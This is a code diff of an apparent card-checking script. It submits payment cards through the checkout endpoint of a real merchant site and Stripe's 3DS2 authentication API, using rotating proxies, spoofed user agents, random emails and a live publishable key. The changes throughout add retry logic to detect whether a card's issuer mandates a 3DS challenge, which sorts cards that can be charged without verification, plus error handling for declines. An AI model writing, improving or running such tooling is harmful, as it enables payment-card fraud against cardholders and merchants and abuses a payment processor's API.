@@ -67,6 +67,9 @@ def generate_random_email():
 
 def parse_proxy(proxy_str):
     """Parse proxy string into components"""
+    if not proxy_str:
+        return None
+        
     parts = proxy_str.split(':')
     if len(parts) == 4:
         ip, port, username, password = parts
@@ -74,13 +77,15 @@ def parse_proxy(proxy_str):
             'http': f'http://{username}:{password}@{ip}:{port}',
             'https': f'http://{username}:{password}@{ip}:{port}'
         }
-    else:
+    elif len(parts) >= 2:
         # If no auth, use without credentials
         ip, port = parts[0], parts[1]
         return {
             'http': f'http://{ip}:{port}',
             'https': f'http://{ip}:{port}'
         }
+    else:
+        return None
 
 def load_proxies():
     """Load proxies from proxy.txt file"""
@@ -139,80 +144,82 @@ def get_payment_nonce(session, proxy_str):
     except Exception as e:
         return None, f"Payment nonce error: {str(e)}"
 
-def extract_3ds_challenge_mandated(website_response):
-    """Extract acsChallengeMandated value directly from the website response without making additional API calls"""
-    try:
-        if not website_response.get('success'):
-            return 'ACSFAILED'
-            
-        data_section = website_response.get('data', {})
-        if data_section.get('status') != 'requires_action':
-            return 'ACSFAILED'
-            
-        # Look for the 3DS data in the response
-        next_action = data_section.get('next_action', {})
-        if next_action.get('type') == 'use_stripe_sdk':
-            use_stripe_sdk = next_action.get('use_stripe_sdk', {})
-            three_d_secure_2_source = use_stripe_sdk.get('three_d_secure_2_source')
-            
-            if three_d_secure_2_source:
-                # The 3DS data might be embedded in the source itself or in the response
-                # Check if there's a redirect URL that contains the 3DS data
-                redirect_url = use_stripe_sdk.get('redirect', {}).get('url', '')
+def get_3ds_challenge_mandated(website_response, proxy_str):
+    """Extract acsChallengeMandated value from 3DS authentication response with retry logic"""
+    max_retries = 2
+    for attempt in range(max_retries):
+        try:
+            # Check if website_response is a dictionary
+            if not isinstance(website_response, dict) or not website_response.get('success'):
+                return 'ACS_EXTRACTION_FAILED'
                 
-                # Sometimes the 3DS data is in the redirect URL parameters
-                if 'acsChallengeMandated=' in redirect_url:
-                    # Extract from URL
-                    match = re.search(r'acsChallengeMandated=([YN])', redirect_url)
-                    if match:
-                        return match.group(1)
+            data_section = website_response.get('data', {})
+            if data_section.get('status') != 'requires_action':
+                return 'ACS_EXTRACTION_FAILED'
                 
-                # Check if there's direct 3DS data in the use_stripe_sdk object
-                three_ds_data = use_stripe_sdk.get('three_ds_data', {})
-                if three_ds_data:
-                    acs_challenge = three_ds_data.get('acsChallengeMandated')
-                    if acs_challenge in ['Y', 'N']:
-                        return acs_challenge
+            next_action = data_section.get('next_action', {})
+            if next_action.get('type') == 'use_stripe_sdk':
+                use_stripe_sdk = next_action.get('use_stripe_sdk', {})
+                three_d_secure_2_source = use_stripe_sdk.get('three_d_secure_2_source')
                 
-                # Check for other possible locations
-                for key in ['acsChallengeMandated', 'challengeMandated', 'threeDSChallengeMandated']:
-                    value = use_stripe_sdk.get(key)
-                    if value in ['Y', 'N']:
-                        return value
+                if three_d_secure_2_source:
+                    time.sleep(0.5)  # Reduced delay for speed
+                    proxies = parse_proxy(proxy_str) if proxy_str else None
+                    headers = stripe_headers.copy()
+                    headers['user-agent'] = get_rotating_user_agent()
                     
-                    # Try nested lookup
-                    if isinstance(value, dict):
-                        nested_value = value.get('acsChallengeMandated') or value.get('challengeMandated')
-                        if nested_value in ['Y', 'N']:
-                            return nested_value
-        
-        # If we can't find it in the obvious places, try to find it anywhere in the response
-        response_str = json.dumps(website_response)
-        pattern = r'["\']?acsChallengeMandated["\']?\s*[:=]\s*["\']?([YN])["\']?'
-        match = re.search(pattern, response_str, re.IGNORECASE)
-        if match:
-            return match.group(1)
+                    auth_data = {
+                        'source': three_d_secure_2_source,
+                        'browser': '{"fingerprintAttempted":false,"fingerprintData":null,"challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"en-GB","browserColorDepth":"24","browserScreenHeight":"864","browserScreenWidth":"1536","browserTZ":"-330","browserUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"}',
+                        'one_click_authn_device_support[hosted]': 'false',
+                        'one_click_authn_device_support[same_origin_frame]': 'false',
+                        'one_click_authn_device_support[spc_eligible]': 'true',
+                        'one_click_authn_device_support[webauthn_eligible]': 'true',
+                        'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
+                        'key': 'pk_live_51IbQ21ItrjNAxRL74KVowqSSvUFQsbInpdW3Nu9IJuNQ00B4cMJGlul12HjkQojXk3L5vvtbvrD4kfEYDvAfu3Nv00NOJyIwrd',
+                        '_stripe_version': '2024-06-20'
+                    }
+                    
+                    auth_response = requests.post(
+                        'https://api.stripe.com/v1/3ds2/authenticate',
+                        headers=headers,
+                        data=auth_data,
+                        proxies=proxies,
+                        timeout=20,  # Reduced timeout
+                        verify=False
+                    )
+                    
+                    if auth_response.status_code == 200:
+                        auth_data_response = auth_response.json()
+                        ares = auth_data_response.get('ares', {})
+                        acs_challenge = ares.get('acsChallengeMandated', 'ACS_EXTRACTION_FAILED')
+                        
+                        # Only return Y or N if explicitly found, otherwise mark as failed
+                        if acs_challenge in ['Y', 'N']:
+                            return acs_challenge
+                        else:
+                            return 'ACS_EXTRACTION_FAILED'
             
-        # Try alternative patterns
-        patterns = [
-            r'challengeMandated["\']?\s*[:=]\s*["\']?([YN])["\']?',
-            r'threeDSChallengeMandated["\']?\s*[:=]\s*["\']?([YN])["\']?',
-            r'acs_challenge_mandated["\']?\s*[:=]\s*["\']?([YN])["\']?'
-        ]
-        
-        for pattern in patterns:
-            match = re.search(pattern, response_str, re.IGNORECASE)
-            if match:
-                return match.group(1)
-        
-        return 'NOTFOUND'
-        
-    except Exception as e:
-        return f'ERROR: {str(e)[:50]}'
+            return 'ACS_EXTRACTION_FAILED'
+            
+        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.HTTPError) as e:
+            if attempt < max_retries - 1:
+                time.sleep(1)
+                continue
+            else:
+                return 'ACS_EXTRACTION_FAILED'
+        except Exception as e:
+            return 'ACS_EXTRACTION_FAILED'
+    
+    return 'ACS_EXTRACTION_FAILED'
 
-def get_final_message(website_response, proxy_str=None):
+def get_final_message(website_response, proxy_str):
     """Extract final user-friendly message from response with 3DS info"""
     try:
+        # Check if website_response is a dictionary
+        if not isinstance(website_response, dict):
+            return "Invalid response format"
+            
         if website_response.get('success'):
             data_section = website_response.get('data', {})
             status = data_section.get('status', '')
@@ -220,20 +227,27 @@ def get_final_message(website_response, proxy_str=None):
             if status == 'succeeded':
                 return "Payment method successfully added."
             elif status == 'requires_action':
-                # Get 3DS challenge mandated info directly from website response
-                acs_challenge_mandated = extract_3ds_challenge_mandated(website_response)
-                if acs_challenge_mandated in ['Y', 'N']:
-                    return f"3D Secure verification required. | ACS Challenge: {acs_challenge_mandated}"
+                acs_challenge_mandated = get_3ds_challenge_mandated(website_response, proxy_str)
+                
+                # Check for authentication failure message
+                error_message = ""
+                if 'error' in data_section:
+                    error_msg = data_section['error'].get('message', '')
+                    if 'unable to authenticate your payment method' in error_msg.lower():
+                        error_message = " | Auth Failed: Unable to authenticate payment method"
+                
+                if acs_challenge_mandated == 'Y':
+                    return f"3D Secure verification required. | ACS Challenge: ✅ Y{error_message}"
+                elif acs_challenge_mandated == 'N':
+                    return f"3D Secure verification required. | ACS Challenge: ❌ N{error_message}"
                 else:
-                    return f"3D Secure verification required. | ACS Challenge: {acs_challenge_mandated}"
+                    return f"3D Secure verification required. | ACS Challenge: {acs_challenge_mandated}{error_message}"
             else:
                 return "Payment method status unknown."
         else:
-            # Extract error message
             error_data = website_response.get('data', {})
             if 'error' in error_data:
                 error_msg = error_data['error'].get('message', 'Declined')
-                # Simplify common error messages
                 if 'cvc' in error_msg.lower() or 'security code' in error_msg.lower():
                     return "Your card's security code is incorrect."
                 elif 'declined' in error_msg.lower():
@@ -242,6 +256,8 @@ def get_final_message(website_response, proxy_str=None):
                     return "Your card has insufficient funds."
                 elif 'expired' in error_msg.lower():
                     return "Your card has expired."
+                elif 'unable to authenticate your payment method' in error_msg.lower():
+                    return "We are unable to authenticate your payment method. Please choose a different payment method and try again."
                 else:
                     return error_msg
             else:
@@ -503,7 +519,16 @@ DECLINED CC ❌
             }
 
             response2 = session.post('https://butcher.ie/wp-admin/admin-ajax.php', headers=headers2, data=data2, proxies=proxies, timeout=30)
-            website_response = response2.json()
+            
+            # Check if response is valid JSON
+            try:
+                website_response = response2.json()
+            except:
+                # If response is not JSON, create a proper response structure
+                website_response = {
+                    'success': False,
+                    'data': {'error': {'message': 'Invalid response from server'}}
+                }
             
             # Get final message with 3DS info
             final_message = get_final_message(website_response, proxy_str)
